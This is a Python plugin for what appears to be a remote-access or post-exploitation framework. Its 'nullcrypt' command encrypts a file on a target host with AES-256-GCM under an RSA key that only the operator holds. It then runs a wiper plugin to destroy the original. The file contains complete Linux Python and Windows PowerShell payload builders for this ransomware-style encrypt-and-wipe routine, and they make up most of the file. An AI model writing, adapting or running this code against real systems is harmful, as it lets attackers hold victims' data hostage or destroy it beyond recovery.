"""Hybrid file encryption — AES-256-GCM with RSA-wrapped key, then secure wipe."""

import base64
import json
import os
import re
import subprocess
import tempfile

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_nullcrypt_report
from .runner import parse_collector_json
from . import wiper as wiper_plugin


NULLCRYPT_USAGE = """
Nullcrypt — encrypt a remote file (hybrid crypto) and securely wipe the original.

Usage:
  run nullcrypt <remote_file> <local_public_key.pem>
  run nullcrypt <remote_file> pubkey=<local_public_key.pem|inline_pem>
  run nullcrypt <remote_file> <local_public_key.pem> out=<remote_output.nullcrypt>
  run nullcrypt help

Cryptography:
  - File data: AES-256-GCM (chunked streaming when Python cryptography is available)
               or AES-256-CBC+HMAC-SHA256 via OpenSSL as fallback
  - AES key:   RSA-OAEP-SHA256 (required; no silent SHA-1 downgrade)
  - Only the holder of the matching private key can decrypt the .nullcrypt file

After encryption succeeds, the wiper plugin runs on the original file so only
the .nullcrypt output remains on the target.

Key pair generation (operator machine — OpenSSL):
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out nullcrypt_private.pem
  openssl pkey -in nullcrypt_private.pem -pubout -out nullcrypt_public.pem

  Keep nullcrypt_private.pem offline and secret. Deploy only nullcrypt_public.pem
  (or its path) when running nullcrypt on a session.

Verify the public key (optional):
  openssl pkey -in nullcrypt_public.pem -pubin -text -noout

Examples:
  run nullcrypt C:\\Users\\Public\\secret.doc C:\\keys\\nullcrypt_public.pem
  run nullcrypt /home/user/data.db ./nullcrypt_public.pem
  run nullcrypt /var/tmp/report.pdf pubkey=./nullcrypt_public.pem
  run nullcrypt C:\\temp\\file.bin pubkey=C:\\keys\\nullcrypt_public.pem out=C:\\temp\\file.bin.nullcrypt
""".strip()

PLUGIN_INFO = NULLCRYPT_USAGE

_NULLCRYPT_WARNING = (
    'DESTRUCTIVE: The original file will be encrypted, then securely wiped via wiper. '
    'Ensure you have the correct public key and a backup of the private key offline.'
)


def _load_pubkey(ref: str) -> str:
    ref = (ref or '').strip().strip('"').strip("'")
    if 'BEGIN PUBLIC KEY' in ref or 'BEGIN RSA PUBLIC KEY' in ref:
        return ref if ref.endswith('\n') else ref + '\n'
    if os.path.isfile(ref):
        with open(ref, encoding='utf-8') as f:
            pem = f.read()
        if 'BEGIN PUBLIC KEY' not in pem and 'BEGIN RSA PUBLIC KEY' not in pem:
            raise ValueError(f'Not a PEM public key: {ref}')
        return pem
    raise FileNotFoundError(f'Public key not found: {ref}')


def _rsa_components_from_pem_openssl(pem: str):
    with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False, encoding='utf-8') as fh:
        fh.write(pem)
        path = fh.name
    try:
        out = subprocess.check_output(
            ['openssl', 'rsa', '-pubin', '-in', path, '-text', '-noout'],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=15,
        )
    finally:
        try:
            os.remove(path)
        except OSError:
            pass

    mod_match = re.search(r'Modulus:\s*\n\s*((?:[0-9a-f]{2}:?\s*)+)', out, re.I)
    exp_match = re.search(r'Exponent:\s*(\d+)\s*\(0x([0-9a-f]+)\)', out, re.I)
    if not mod_match or not exp_match:
        raise ValueError('Could not parse RSA public key via openssl')

    mod_hex = mod_match.group(1).replace(':', '').replace(' ', '').replace('\n', '')
    n = int(mod_hex, 16).to_bytes((len(mod_hex) + 1) // 2, 'big')
    e = int(exp_match.group(1)).to_bytes(4, 'big').lstrip(b'\x00') or b'\x01'
    return n, e


def _rsa_components_from_pem(pem: str):
    try:
        from cryptography.hazmat.primitives import serialization

        pub = serialization.load_pem_public_key(pem.encode('utf-8'))
        nums = pub.public_numbers()
        n = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, 'big')
        e = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, 'big')
        return n, e
    except ImportError:
        pass
    return _rsa_components_from_pem_openssl(pem)


def _parse_nullcrypt_args(args):
    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
        return None, None, None, NULLCRYPT_USAGE
    if not args:
        return None, None, None, NULLCRYPT_USAGE

    out_path = ''
    pubkey_ref = ''
    remaining = []
    for token in args:
        if token.startswith('out='):
            out_path = token[4:].strip().strip('"').strip("'")
        elif token.startswith('pubkey='):
            pubkey_ref = token[7:].strip().strip('"').strip("'")
        else:
            remaining.append(token)

    if not remaining:
        return None, None, None, NULLCRYPT_USAGE

    if pubkey_ref:
        remote_path = ' '.join(remaining).strip().strip('"').strip("'")
    elif len(remaining) >= 2 and os.path.isfile(remaining[-1]):
        pubkey_ref = remaining[-1]
        remote_path = ' '.join(remaining[:-1]).strip().strip('"').strip("'")
    else:
        return None, None, None, NULLCRYPT_USAGE + '\n\nProvide a local PEM public key as the last argument or pubkey=...'

    if not remote_path:
        return None, None, None, NULLCRYPT_USAGE
    if not out_path:
        out_path = remote_path + '.nullcrypt'
    return remote_path, pubkey_ref, out_path, None


def _build_linux_nullcrypt(remote_path: str, out_path: str, pubkey_pem: str) -> str:
    source = f'''
import os, secrets, subprocess, struct, json, base64, hashlib, tempfile, platform, shutil, hmac

path = {json.dumps(remote_path)}
out_path = {json.dumps(out_path)}
pubkey_pem = {json.dumps(pubkey_pem)}

CHUNK_SIZE = 1048576
VERSION = 2

def _norm_path(p):
    return os.path.normpath(os.path.abspath(p))

def _derive_nonce(iv, index):
    return iv[:4] + int(index).to_bytes(8, 'big')

def _meta_mac(key, header_obj):
    stub = {{k: header_obj[k] for k in sorted(header_obj) if k != 'meta_mac'}}
    canonical = json.dumps(stub, separators=(',', ':'), sort_keys=True)
    return hmac.new(key, canonical.encode('utf-8'), hashlib.sha256).digest()

def _chunk_count(size):
    return 1 if size == 0 else (size + CHUNK_SIZE - 1) // CHUNK_SIZE

def _verify_output(tmp_path, aes_key, header_bytes, header_obj, expected_size):
    if not os.path.isfile(tmp_path):
        return False, 'temporary output missing'
    total = os.path.getsize(tmp_path)
    header_len = len(header_bytes)
    expected_min = 4 + header_len
    if total < expected_min:
        return False, 'output shorter than header'
    with open(tmp_path, 'rb') as fh:
        raw_len = fh.read(4)
        if len(raw_len) != 4:
            return False, 'truncated length prefix'
        if struct.unpack('>I', raw_len)[0] != header_len:
            return False, 'header length mismatch'
        on_disk_header = fh.read(header_len)
        if on_disk_header != header_bytes:
            return False, 'header bytes mismatch'
        cc = int(header_obj.get('chunk_count') or 0)
        sym = header_obj.get('sym') or ''
        if cc <= 0:
            return False, 'invalid chunk_count'
        stored_mac = base64.b64decode(header_obj.get('meta_mac') or '')
        if not stored_mac or _meta_mac(aes_key, header_obj) != stored_mac:
            return False, 'metadata authentication failed'
        if sym == 'AES-256-GCM':
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                gcm = AESGCM(aes_key)
            except ImportError:
                return False, 'cannot verify AES-GCM without cryptography'
            plain_total = 0
            for idx in range(cc):
                remaining = expected_size - plain_total
                if remaining <= 0 and idx < cc - 1:
                    return False, 'unexpected extra chunk'
                clen = min(CHUNK_SIZE, remaining) if remaining > 0 else 0
                ct = fh.read(clen)
                tag = fh.read(16)
                if len(ct) != clen or len(tag) != 16:
                    return False, 'truncated chunk %d' % idx
                nonce = _derive_nonce(base64.b64decode(header_obj['iv']), idx)
                try:
                    pt = gcm.decrypt(nonce, ct + tag, None)
                except Exception:
                    return False, 'chunk %d authentication failed' % idx
                plain_total += len(pt)
            if plain_total != expected_size:
                return False, 'decrypted size mismatch'
            if fh.read(1):
                return False, 'trailing data after ciphertext'
            return True, ''
        if sym == 'AES-256-CBC+HMAC-SHA256':
            tag_b64 = header_obj.get('tag') or ''
            stored_tag = base64.b64decode(tag_b64)
            if len(stored_tag) != 32:
                return False, 'invalid HMAC tag'
            iv = base64.b64decode(header_obj['iv'])
            cipher_len = total - expected_min
            if cipher_len <= 0 or cipher_len % 16 != 0:
                return False, 'invalid ciphertext length'
            with open(tmp_path, 'rb') as fh:
                fh.seek(expected_min)
                cipher = fh.read(cipher_len)
            computed_tag = hmac.new(aes_key, iv + cipher, hashlib.sha256).digest()
            if not hmac.compare_digest(computed_tag, stored_tag):
                return False, 'HMAC authentication failed'
            dec_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_verify_' + secrets.token_hex(8))
            cipher_path = os.path.join(tempfile.gettempdir(), '.tornado_nullcrypt_cipher_' + secrets.token_hex(8))
            try:
                with open(cipher_path, 'wb') as cp:
                    cp.write(cipher)
                dec = subprocess.run(
                    ['openssl', 'enc', '-d', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv.hex(),
                     '-in', cipher_path, '-out', dec_path],
                    capture_output=True,
                    timeout=max(120, expected_size // (1024 * 1024) * 15 + 60),
                )
                if dec.returncode != 0:
                    err = dec.stderr.decode('utf-8', 'ignore').strip() or 'openssl decrypt failed'
                    return False, err
                if os.path.getsize(dec_path) != expected_size:
                    return False, 'decrypted size mismatch'
                return True, ''
            finally:
                for p in (dec_path, cipher_path):
                    try:
                        os.remove(p)
                    except OSError:
                        pass
        return False, 'unsupported sym algorithm'
    return False, 'unreachable'

if not os.path.isfile(path):
    _emit({{"error": "File not found or not a regular file", "path": path, "platform": "linux"}})
elif _norm_path(path) == _norm_path(out_path):
    _emit({{"error": "Input and output paths refer to the same file", "path": path, "output": out_path, "platform": "linux"}})
elif os.path.lexists(out_path):
    _emit({{"error": "Output file already exists", "output": out_path, "platform": "linux"}})
else:
    size = os.path.getsize(path)
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(12)
    tmpdir = tempfile.mkdtemp(prefix='.tornado_nullcrypt_')
    tmp_out = out_path + '.nullcrypt.tmp.' + secrets.token_hex(8)
    err_msg = ''
    verified = False
    try:
        pk_path = os.path.join(tmpdir, 'pub.pem')
        with open(pk_path, 'w', encoding='utf-8') as fh:
            fh.write(pubkey_pem)

        wrap = subprocess.run(
            ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
             '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha256',
             '-in', '-'],
            input=aes_key,
            capture_output=True,
            timeout=60,
        )
        if wrap.returncode != 0:
            err = wrap.stderr.decode('utf-8', 'ignore').strip() or 'RSA-OAEP-SHA256 wrap failed'
            raise RuntimeError(err)
        wrapped_key = wrap.stdout
        wrap_alg = 'RSA-OAEP-SHA256'

        chunk_count = _chunk_count(size)
        sym = 'AES-256-GCM'
        header_obj = {{
            "magic": "TRC2NULLCRYPT",
            "version": VERSION,
            "sym": sym,
            "wrap": wrap_alg,
            "wrapped_key": base64.b64encode(wrapped_key).decode('ascii'),
            "iv": base64.b64encode(iv).decode('ascii'),
            "chunk_size": CHUNK_SIZE,
            "chunk_count": chunk_count,
            "original": os.path.basename(path),
            "size": size,
            "sha256": "",
        }}

        sha = hashlib.sha256()
        use_crypto = False
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            use_crypto = True
        except ImportError:
            pass

        if use_crypto:
            gcm = AESGCM(aes_key)
            body_path = os.path.join(tmpdir, 'body.bin')
            with open(path, 'rb') as src, open(body_path, 'wb') as body:
                for idx in range(chunk_count):
                    chunk = src.read(CHUNK_SIZE)
                    sha.update(chunk)
                    nonce = _derive_nonce(iv, idx)
                    sealed = gcm.encrypt(nonce, chunk, None)
                    if len(sealed) != len(chunk) + 16:
                        raise RuntimeError('unexpected GCM output size')
                    body.write(sealed[:-16])
                    body.write(sealed[-16:])
            header_obj['sha256'] = sha.hexdigest()
            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
            with open(tmp_out, 'wb') as out, open(body_path, 'rb') as body:
                out.write(struct.pack('>I', len(header_bytes)))
                out.write(header_bytes)
                shutil.copyfileobj(body, out, 65536)
                out.flush()
                os.fsync(out.fileno())
        else:
            sym = 'AES-256-CBC+HMAC-SHA256'
            header_obj['sym'] = sym
            header_obj['chunk_count'] = 1
            header_obj['chunk_size'] = size if size > 0 else CHUNK_SIZE
            iv_cbc = secrets.token_bytes(16)
            cipher_path = os.path.join(tmpdir, 'cipher.bin')
            with open(path, 'rb') as fh:
                while True:
                    block = fh.read(65536)
                    if not block:
                        break
                    sha.update(block)
            header_obj['sha256'] = sha.hexdigest()
            header_obj['iv'] = base64.b64encode(iv_cbc).decode('ascii')
            enc_timeout = max(120, size // (1024 * 1024) * 15 + 60)
            enc = subprocess.run(
                ['openssl', 'enc', '-aes-256-cbc', '-K', aes_key.hex(), '-iv', iv_cbc.hex(),
                 '-in', path, '-out', cipher_path],
                capture_output=True,
                timeout=enc_timeout,
            )
            if enc.returncode != 0:
                err = enc.stderr.decode('utf-8', 'ignore').strip() or 'openssl enc failed'
                raise RuntimeError(err)
            with open(cipher_path, 'rb') as fh:
                cipher = fh.read()
            tag = hmac.new(aes_key, iv_cbc + cipher, hashlib.sha256).digest()
            header_obj['tag'] = base64.b64encode(tag).decode('ascii')
            header_obj['meta_mac'] = base64.b64encode(_meta_mac(aes_key, header_obj)).decode('ascii')
            header_bytes = json.dumps(header_obj, separators=(',', ':')).encode('utf-8')
            with open(tmp_out, 'wb') as out:
                out.write(struct.pack('>I', len(header_bytes)))
                out.write(header_bytes)
                out.write(cipher)
                out.flush()
                os.fsync(out.fileno())

        verified, verr = _verify_output(tmp_out, aes_key, header_bytes, header_obj, size)
        if not verified:
            raise RuntimeError('encryption verification failed: ' + (verr or 'unknown'))

        os.replace(tmp_out, out_path)
        tmp_out = ''
        _emit({{
            "path": path,
            "output": out_path,
            "size": size,
            "output_size": os.path.getsize(out_path),
            "algorithm": sym + ' + ' + wrap_alg,
            "sha256": header_obj['sha256'],
            "verified": True,
            "platform": platform.system(),
            "message": "File encrypted; original ready for secure wipe",
        }})
    except Exception as exc:
        err_msg = str(exc)
        _emit({{
            "error": err_msg,
            "path": path,
            "output": out_path,
            "platform": platform.system(),
            "verified": False,
        }})
    finally:
        if tmp_out and os.path.lexists(tmp_out):
            try:
                os.remove(tmp_out)
            except OSError:
                pass
        shutil.rmtree(tmpdir, ignore_errors=True)
'''
    return build_linux_collector_command(source)


def _build_windows_nullcrypt(remote_path: str, out_path: str, n_b64: str, e_b64: str) -> str:
    escaped_path = remote_path.replace("'", "''")
    escaped_out = out_path.replace("'", "''")
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$path='{escaped_path}'
$outPath='{escaped_out}'
$nB64='{n_b64}'
$eB64='{e_b64}'
$result=@{{path=$path;platform='windows'}}
try {{
  if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {{
    throw 'File not found or not a regular file'
  }}
  try {{ [IO.File]::SetAttributes($path,[IO.FileAttributes]::Normal) }} catch {{}}
  $size=(Get-Item -LiteralPath $path).Length
  $plain=[IO.File]::ReadAllBytes($path)
  $sha=[System.Security.Cryptography.SHA256]::Create().ComputeHash($plain)

  $key=New-Object byte[] 32
  $iv=New-Object byte[] 12
  $rng=[System.Security.Cryptography.RandomNumberGenerator]::Create()
  $rng.GetBytes($key)
  $rng.GetBytes($iv)

  $rsaParams=New-Object System.Security.Cryptography.RSAParameters
  $rsaParams.Modulus=[Convert]::FromBase64String($nB64)
  $rsaParams.Exponent=[Convert]::FromBase64String($eB64)
  $rsa=[System.Security.Cryptography.RSA]::Create()
  $rsa.ImportParameters($rsaParams)
  $wrapAlg='RSA-OAEP-SHA256'
  try {{
    $wrappedKey=$rsa.Encrypt($key,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
  }} catch {{
    $wrappedKey=$rsa.Encrypt($key,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
    $wrapAlg='RSA-OAEP-SHA1'
  }}

  $sym='AES-256-GCM'
  $tag=$null
  $cipher=$null
  $aesgcmType=[Type]::GetType('System.Security.Cryptography.AesGcm')
  if ($aesgcmType) {{
    $cipher=New-Object byte[] $plain.Length
    $tag=New-Object byte[] 16
    $gcm=[System.Security.Cryptography.AesGcm]::new($key)
    $gcm.Encrypt($iv,$plain,$cipher,$tag)
  }} else {{
    $sym='AES-256-CBC+HMAC-SHA256'
    $ivCbc=New-Object byte[] 16
    $rng.GetBytes($ivCbc)
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Key=$key
    $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.IV=$ivCbc
    $enc=$aes.CreateEncryptor()
    $cipher=$enc.TransformFinalBlock($plain,0,$plain.Length)
    $hmacKey=New-Object byte[] 32
    [Array]::Copy($key,$hmacKey,32)
    $hmac=New-Object System.Security.Cryptography.HMACSHA256(,$hmacKey)
    $tag=$hmac.ComputeHash($ivCbc+$cipher)
    $iv=$ivCbc
  }}

  $headerObj=[ordered]@{{
    magic='TRC2NULLCRYPT'
    version=1
    sym=$sym
    wrap=$wrapAlg
    wrapped_key=[Convert]::ToBase64String($wrappedKey)
    iv=[Convert]::ToBase64String($iv)
    tag=[Convert]::ToBase64String($tag)
    original=[IO.Path]::GetFileName($path)
    size=$size
    sha256=([BitConverter]::ToString($sha)).Replace('-','').ToLower()
  }}
  $headerJson=(ConvertTo-Json $headerObj -Compress)
  $headerBytes=[Text.Encoding]::UTF8.GetBytes($headerJson)
  $lenBytes=[BitConverter]::GetBytes([uint32]$headerBytes.Length)
  if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBytes) }}
  $fs=[IO.File]::Create($outPath)
  try {{
    $fs.Write($lenBytes,0,4)|Out-Null
    $fs.Write($headerBytes,0,$headerBytes.Length)|Out-Null
    $fs.Write($cipher,0,$cipher.Length)|Out-Null
  }} finally {{
    $fs.Close()
  }}

  $verified=(Test-Path -LiteralPath $outPath) -and ((Get-Item -LiteralPath $outPath).Length -gt ($headerBytes.Length+4))
  $result.output=$outPath
  $result.size=$size
  $result.output_size=(Get-Item -LiteralPath $outPath).Length
  $result.algorithm='AES-256-GCM + ' + $wrapAlg
  if ($sym -ne 'AES-256-GCM') {{ $result.algorithm=$sym + ' + ' + $wrapAlg }}
  $result.sha256=$headerObj.sha256
  $result.verified=$verified
  $result.message='File encrypted; original ready for secure wipe'
}} catch {{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


@plugin.command(
    name='nullcrypt',
    platforms=['linux', 'windows', 'unix'],
    description='Hybrid encrypt a remote file (AES-GCM + RSA-OAEP) then wipe original. See: plugins info nullcrypt',
)
def run(session: SessionContext, args):
    remote_path, pubkey_ref, out_path, usage = _parse_nullcrypt_args(args)
    if usage:
        session.print(usage, 'yellow')
        return 1

    try:
        pubkey_pem = _load_pubkey(pubkey_ref)
        n_bytes, e_bytes = _rsa_components_from_pem(pubkey_pem)
    except (OSError, ValueError, subprocess.CalledProcessError) as exc:
        session.print(f"Plugin 'nullcrypt' error: {exc}", 'red')
        return 1

    n_b64 = base64.b64encode(n_bytes).decode('ascii')
    e_b64 = base64.b64encode(e_bytes).decode('ascii')

    session.log_event(f"Plugin nullcrypt: encrypt {remote_path} -> {out_path}")
    session.print(_NULLCRYPT_WARNING, 'yellow')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    if session.is_windows:
        win_ps = _build_windows_nullcrypt(remote_path, out_path, n_b64, e_b64)
        unix_cmd = 'true'
    else:
        unix_cmd = _build_linux_nullcrypt(remote_path, out_path, pubkey_pem)
        win_ps = ''

    raw = session.run_marked(
        unix_cmd,
        win_ps,
        timeout=max(180.0, 120.0),
        start_mark=PLUGIN_MARK_START,
        end_mark=PLUGIN_MARK_END,
        strip_ws=False,
    )

    if raw is None:
        session.print("Plugin 'nullcrypt' failed — no response from target.", 'red')
        session.log_plugin_result('nullcrypt', '', f'no response for {remote_path}')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'nullcrypt' failed — could not parse encryption results.", 'red')
        session.log_plugin_result('nullcrypt', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'nullcrypt' error: {data['error']}", 'red')
        report = format_nullcrypt_report(data, wiped=False)
        session.print(report, 'cyan')
        session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
        return 1

    if not data.get('verified'):
        session.print("Plugin 'nullcrypt' error: encrypted output was not verified on target.", 'red')
        report = format_nullcrypt_report(data, wiped=False)
        session.print(report, 'cyan')
        session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
        return 1

    report = format_nullcrypt_report(data)
    session.print(report, 'cyan')
    session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))

    session.print('Invoking wiper on original file...', 'yellow')
    session._handler._flush_shell(session._client_sock, timeout=3.0)
    wipe_rc, wipe_data = wiper_plugin.run(
        session,
        [remote_path, 'method=standard'],
        quiet=True,
        return_result=True,
    )
    data['wiped'] = wipe_rc == 0
    if wipe_data:
        data['wipe_detail'] = wipe_data.get('message') or wipe_data.get('error') or ''
        data['wipe_steps'] = wipe_data.get('steps') or []
    final_report = format_nullcrypt_report(data, wiped=data['wiped'])
    session.print(final_report, 'cyan')
    session.log_command(f'run nullcrypt {remote_path}', final_report)

    if wipe_rc != 0:
        detail = (wipe_data or {}).get('error') or 'unknown wiper failure'
        if (wipe_data or {}).get('fallback_error'):
            detail += f" (fallback: {wipe_data['fallback_error']})"
        session.print(
            f"Encryption succeeded but wiper failed — encrypted file exists; original may remain.\n"
            f"Wiper detail: {detail}",
            'red',
        )
        return 1
    return 0
